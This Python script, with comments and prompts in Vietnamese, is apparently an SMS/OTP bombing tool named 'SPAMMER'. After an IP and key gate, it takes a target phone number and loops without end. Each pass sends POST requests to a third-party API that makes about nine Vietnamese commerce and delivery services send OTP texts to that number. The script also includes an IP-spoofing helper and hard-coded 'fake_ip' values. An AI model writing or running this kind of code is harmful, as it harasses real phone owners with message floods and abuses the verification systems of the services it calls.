'''Bản quyền: https://www.youtube.com/c/L%C3%AAQuanggMinhhOfficial'''
from time import sleep
import tkinter
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
from time import sleep
import webbrowser as wb
from pygame import mixer
import pyttsx3





# âm thanh huấn
sound_huan = 'item/Am-thanh-co-lam-moi-co-an-huan-hoa-hong-www_tiengdong_com.mp3'
# set tiếng nói
bot = pyttsx3.init()
voice = bot.getProperty('voices')
# id : 0 là trai, 1 là gái
bot.setProperty('voice',voice[1].id)
def speak(audio):# hàm nói
    global speak
    print("SPAMMER :" + audio)
    bot.say(audio)
    bot.runAndWait()
#check_ip_client
os.system('cls')
with open('item/youripaddress.txt', 'r') as f:
    ip_client =  f.read()

    if ip_client == '192.168.0.104' or ip_client == '192.168.51.103':
      print('[+] Your IP is allowed')
    elif ip_client == 'boladucday':
      print('[-] Đây là trường hợp ngoại lệ')  
    else :
      print('[-] Your IP is not allowed')
      mixer.init()
      mixer.music.load(sound_huan)  
      mixer.music.play()
      sleep(9)
      sys.exit()  

nhapkey = input("NHẬP KEY XONG MỚI ĐƯỢC NGHỊCH NHÉ: ")

if 'huakhongchiasechoai' in nhapkey:
  print("Chơi thôi nào!!!")

else:
    print("""           (..........................#@@@@@@@%##%@@@@@@&%/..........................,,,,**
           (........................*#@@(***,,,,,,,.,,**%@@,..........................,,,,*
           (......................./&(//***,,,,*,*/(###((//%,.........................,,,**
           (.......................@/(####((///**/(((/,,**//(* .......................,,,**
           (......................,((/////(#((/*.*/*%%&&%&#///*........................,,**
           (......................*//(%##(////*,.,***,..,,,**//........................,,**
           (......................,//////**//*//*/////////////(/.......................,***
           (.......................////////(((((#####**/((((((((((/....................,***
           (.....................#(//(////(((((#######((((((((((*/,....................,***
           (.....................*(((/(/(((#(&&@@@@@&&@@%((((((/.......................,***
           (........................((((((((((########((//(((##,.......................,***
           (........................../((((((((((((//**///(####................,,*,.....,**
           (.......................*(%&&%#####(((((((((##%%&&&(////#///(((////////////(%,**
           (......................(((#%&&&&&&&&&&&&&&&&&&&%(((((((((%((((((((((((///(#(//**
           (..................((((((((((((((((((##*.##,(((((((((((((&(((((((((((((((#//////
           (................./####((((((((((##((###.,,*#((###((#%&&&&#(((((((((((((%#(((///
           (.......,*/////((#####%%%&&&%%#%%%%%####%...%###%%%%%%&%#%%((((((((((((((#//////
           (....///////////(#######%%%&&%%##########...####%%%%%%%##%%(((((((((((((((((////    """)
    mixer.init()
    mixer.music.load(sound_huan)  
    mixer.music.play()
    sleep(9)
    os.system('cls')

    sys.exit()  
try:
  from pystyle import Center, Anime, Colors, Colorate
except:

  sys.exit()

#spoof
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
#fake_ip
fake_ip = '103.74.121.46'
fake_ip = '14.248.80.77'
fake_ip = '113.161.59.136'
fake_ip = '14.241.225.179'
fake_ip = '14.162.146.186'
fake_ip = '113.160.182.236'
fake_ip = '112.137.142.8'
fake_ip = '51.105.46.78'
fake_ip = '112.137.142.8'
fake_ip = '14.162.146.186'
fake_ip = '50.219.7.214'
fake_ip = '50.219.7.213'
fake_ip = '222.252.3.2'
fake_ip = '113.160.247.27'
def banner():
 banner = f"""
 \033[1;93m
          GBBBBBGGBBBBG#&&&##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##&&&#BBBBBGGBBBBBG
          GGGBBBBGGGBBB#&&&###&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&###&&&#BBBGGGBBBBGGG
          GGGGPGBBBGGGB#&&&####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&####&&&#BGGGBBBGGGGGG
          BGGGPPGGBBBGG#&&&##BB##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##B###&&&#GGBBBGGPPGGGB
          BBBGGGPPGGGBB#&&&###BB##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#BGB###&&&#BBGGGPGGGGBBB
          BBBBGGPPGGGGG#&&&####BB#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&BB#####&&&#GGGGGPPGGBBBB
          BBBBGGPPPPGGG#&&&#BB####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&####BB#&&&#GGPPPPPGGBBBB
          BBBBBGGGPPPPG#&&&##BB###&&&##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##&&&###BB##&&&#GPPPPGGGBBBBB
          BBBBGGGGGGGGG#&&&#B#####&&&###&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&###&&&#####B#&&&#GGGGGGGGGBBBB
          G5PGGGPPPPGGG#&&&#BBBB##&&&#####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#####&&&##BBBB#&&&#GGGPPPGGGGPPG
          BGGGGGGGPP5PGB#&&#BBBBB#&&&#BB##&&&&&&&&&&&&&&&&&&#&&&&&&&&&&&&&&&&&##BB#&&&#BBBBB#&&#BG5PPPGGGGGGGB
          BBBGGGGPPPPPGB#&&##BGGBB&&&#####&&&&&&&&&&&&&&##BGPBB#&&&&&&&&&&&&&&#####&&&BGGGB##&&#BGPPPPPGGGGBBB
          BBBGGGGGGPGGGB#&&#BBBBBB#&&#####&&##&&&&&&&&#GPBBGB#BBB#&&&&&&&&##&&#####&&#BBBBBB#&&#BGGGGGGGGGGBBB
          BBGGGGGGPPGGGB##&#BBBBB##&&##B##&&###&&&&&&G5BB####BB#BPB&&&&&&###&&##B##&&##BBBBB#&##BGGGPPGGGGGGBB
          BBGPP555PPPGGB##&#BBBBBB#&&###B#&&###&&&&&GG#####&######BG&&&&&###&&#####&&#BBBBBB#&##BGGPPP555PGGBB
          BBBGGPP555PPPB##&#BBBBB##&&#####&####&&&#PPB#####B#&####BGG#&&&####&#####&&##BBBBB#&##BPPP555PGGGBBB
          BBBGGP55YPPPPB##&#BBBBB##&&#####&#####&#GB##B##B##&#####B#GG#&#####&#####&&#BBBBBB#&##BPPP5Y55GGGBBB
          GPPGGPPPPPPPGB##&BBBBBBB#&&#####&####&#P5#B##BBB###BBBBB#BG5G&#####&##B##&&#BBBBBBB&##BGPPPPPPPGGPGG
          BGGGGGPPP5PPPB##&#BBBBBB#&&B#BB#&####&G5GBBBBB##########B#BGPB&####&#BB##&&#BBBBBB#&##BPPP5PPPGGGGBB
          BBGGGGP5YY5PPB##&#BBBBB##&&#####&&####B&&&&&&&&&&&&&&&&&&&&&BB&###&&#####&&##BBBBB#&##BP55Y55PGGGGBB
          BBBGGGGPPPPPGB##&##BBBB##&&#####&##BBBB##&&&&&&###&#&&&&&&&#B#BB##&&#####&&##BBBBB#&##BGPPPPPGGGGBBB
          GGGGGPPPPPPPGB##&#BBBBB##&&####BBGGBBBBBBBB####BBBBBBB####BBB#BGBGB######&&##BBBBB#&&#BGPPPPPPPGGGGG
          BBGGGGGPPPPPGB##&BBGGGBB#&&###GGGBGBBBBBGGGGGGGGGGGGGGGGGGGBBBBBBGPPB####&&#BBGGGB#&&#BGGPPPPPGGGBBB
          BBGPGGGPPPGGGB#&&#BBBB###&&#BPGBBBBGGGGGPPPPP55PPP5PPPPPPPPGGGGGBBGBBGB##&&&##BBBB#&&#BGGGPPPGGPPBBB
          BBGGP5GPPPGGGB#&&#B#BBB##&#BPGBBBGGGPPPPP5555YYYYYYYYYY55555PPPPGGGGBGPGB#&##BB#B##&&#BGGGPPGP5GGGBB
          GGGGGPGGGGGGGB&&&#BB#B##&&BBB######BBBBBBBBBBBBBBGGBBBBBBBBBBBBB#######G5B&&#BBBBB#&&&BGGGGGGGPGGGGG
          BBBGGP55555PG#&&&#######BPG#B#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&BBBB##BBBB##&&&BPP55555PGGBBB
          GGPPPPPPPGGGG#&&&#BBBBBGGBB#B#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#B##GGGB#BBB#&&&#GGGPPPPPPPGGG
          BBBBGGGGGGGGG#&&&###BGGBBBBB##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#BGBBBGGBB###&&&#GGGGGGGGGBBBB
          BBBBBBG5PGGGG#&&&##BPB######BB&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##&&##B#BGP##&&&#GGGG5PGBBBBBB
          BBBBBBGGGGGGB#&&&##GB###&##B##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&###&#####BG##&&&#BGGGGGGGBBBBB
          BBGPPGGBBBBGG#&&&##PGB#######B#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&B#####B##GP##&&&#GGBBBGGGPGGBB
          BGGBBBBBG55GG#&&&##GGBBB#B#####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##B#&###BBG###&&&#GP5PGBBBBBGGB
          BBBBBBGPPGBBB#&&&#####B#####B##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&########B#####&&&#BBGGPPGBBBBBB
          BBBBBBBBBBBBB#&&&#######&&&#####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#######&&&#BBBBBBBBBBBBB   


                            SPAMMER HEHE - 'MỌI HÀNH ĐỘNG VI PHẠM PHÁP LUẬT ĐỀU PHẢI TRẢ GIÁ'              
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush()
os.system("cls" if os.name == "nt" else "clear")
banner()
sdt=input(str('\033[1;33mPhone Number: '))
if '0373871213' in sdt:
  print("Mơ đi cưng:3")
  time.sleep(2)
  wb.get().open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
  sys.exit()
time_delay = int(input('\033[1;33mTime Delay (lớn hơn 10s): '))
if time_delay < 10:
  print('\033[1;31mTime Delay phải lớn hơn 10s')
  time.sleep(2)
  sys.exit()
print('\033[1;97m===========================================================================')
stt=0
while True:
    stt+=1
    string=requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/elines?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/meta-vn?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/bach-hoa-xanh?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/grab-food?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/tiki?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={sdt}').text
    string=requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={sdt}').text
    print(f'\033[1;97m[{stt}]\033[1;96m Success Send OTP\033[1;94m-\033[1;95mPhone\033[1;94m-\033[1;94m{sdt}')
    speak('Success Send OTP Phone')

    for a in range(time_delay,0,-1):
        print(f'Tiếp Tục Spam Sau {a}s ', end='\r')
        sleep(1)